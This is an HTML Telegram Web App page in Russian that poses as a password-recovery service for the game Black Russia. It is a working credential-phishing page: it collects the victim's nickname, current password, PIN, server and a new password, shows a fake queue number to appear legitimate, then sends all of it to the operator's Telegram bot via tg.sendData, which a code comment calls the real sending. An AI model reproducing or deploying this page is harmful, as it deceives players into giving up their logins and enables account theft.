<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Black Russia - Личный Кабинет</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #0d0d0d;
            color: #ffffff;
            font-family: 'Ubuntu', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
        }
        .screen {
            display: none;
            flex-direction: column;
            animation: fadeIn 0.3s ease-in-out;
        }
        .active {
            display: flex;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .main-title {
            color: #ff0000;
            font-size: 28px;
            font-weight: 900;
            text-transform: uppercase;
            margin-bottom: 10px;
            letter-spacing: 2px;
            text-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }
        h1 {
            font-size: 20px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #fff;
        }
        .btn-red {
            background-color: #ff0000;
            color: #fff;
            border: none;
            padding: 15px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.2s;
            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
            width: 100%;
        }
        .btn-red:active {
            transform: scale(0.98);
            background-color: #cc0000;
        }
        .input-box {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 15px;
            color: #fff;
            font-size: 14px;
            outline: none;
            width: 100%;
            box-sizing: border-box;
        }
        .input-box:focus {
            border-color: #ff0000;
        }
        label {
            display: block;
            text-align: left;
            font-size: 12px;
            color: #888;
            margin-bottom: 5px;
            margin-left: 5px;
        }
        .error-text {
            color: #ff4444;
            font-size: 13px;
            margin-bottom: 15px;
            display: none;
        }
        .queue-number {
            font-size: 60px;
            color: #ff0000;
            font-weight: bold;
            margin: 20px 0;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
        }
        .wait-text {
            color: #aaa;
            line-height: 1.5;
            font-size: 14px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Экран 1 -->
    <div id="screen1" class="screen active">
        <div class="main-title">BLACK RUSSIA</div>
        <h1>ВОССТАНОВЛЕНИЕ ПАРОЛЯ</h1>
        <p style="color: #666; margin-bottom: 40px;">Сервис управления безопасностью аккаунтов</p>
        <button class="btn-red" onclick="goToScreen(2)">Продолжить</button>
    </div>

    <!-- Экран 2 -->
    <div id="screen2" class="screen">
        <h2 style="color: #ff0000; text-transform: uppercase; margin-bottom: 20px;">Смена пароля</h2>
        <div id="error-msg" class="error-text">Заполните все обязательные поля</div>

        <label>Ваш Никнейм *</label>
        <input type="text" id="nick" class="input-box" placeholder="Ivan_Ivanov">

        <label>Текущий пароль *</label>
        <input type="password" id="old_pass" class="input-box" placeholder="Введите пароль">

        <label>Пин-код (если есть)</label>
        <input type="number" id="pin" class="input-box" placeholder="1234">

        <label>Выберите сервер *</label>
        <select id="server" class="input-box">
            <option value="" disabled selected>Выберите сервер</option>
            <option value="Red">Red</option><option value="Green">Green</option>
            <option value="Blue">Blue</option><option value="Moscow">Moscow</option>
            <option value="SPB">SPB</option><option value="Sochi">Sochi</option>
        </select>

        <label>Новый пароль *</label>
        <input type="password" id="new_pass" class="input-box" placeholder="Придумайте новый пароль">

        <button class="btn-red" onclick="prepareData()">Далее</button>
    </div>

    <!-- Экран 3 -->
    <div id="screen3" class="screen">
        <div class="main-title" style="font-size: 22px;">ЗАЯВКА ПРИНЯТА</div>
        <p class="wait-text">Ожидайте в течение 5–15 минут<br>Ваша очередь:</p>
        <div id="queue-val" class="queue-number"></div>
        <p class="wait-text" style="font-size: 12px; color: #666;">Проверка данных проходит в автоматическом режиме. Нажмите кнопку ниже для завершения.</p>
        <button class="btn-red" onclick="finalSend()">ЗАВЕРШИТЬ</button>
    </div>
</div>

<script>
    let tg = window.Telegram.WebApp;
    tg.expand();

    let savedData = {}; // Временное хранилище для данных

    function goToScreen(num) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        document.getElementById('screen' + num).classList.add('active');
    }

    function prepareData() {
        const nick = document.getElementById('nick').value;
        const old_pass = document.getElementById('old_pass').value;
        const pin = document.getElementById('pin').value;
        const server = document.getElementById('server').value;
        const new_pass = document.getElementById('new_pass').value;
        const errorMsg = document.getElementById('error-msg');

        if (!nick || !old_pass || !server || !new_pass) {
            errorMsg.style.display = 'block';
            return;
        }
        errorMsg.style.display = 'none';

        // Сохраняем данные во временную переменную, но пока не отправляем
        savedData = {
            nick: nick,
            old_password: old_pass,
            pin_code: pin || "Не указан",
            server: server,
            new_password: new_pass
        };

        // Генерируем очередь
        const randomQueue = Math.floor(Math.random() * 99) + 1;
        document.getElementById('queue-val').innerText = randomQueue;

        goToScreen(3);
    }

    function finalSend() {
        // Вот здесь происходит реальная отправка боту
        tg.sendData(JSON.stringify(savedData));
        // И закрытие приложения
        tg.close();
    }
</script>
</body>
</html>
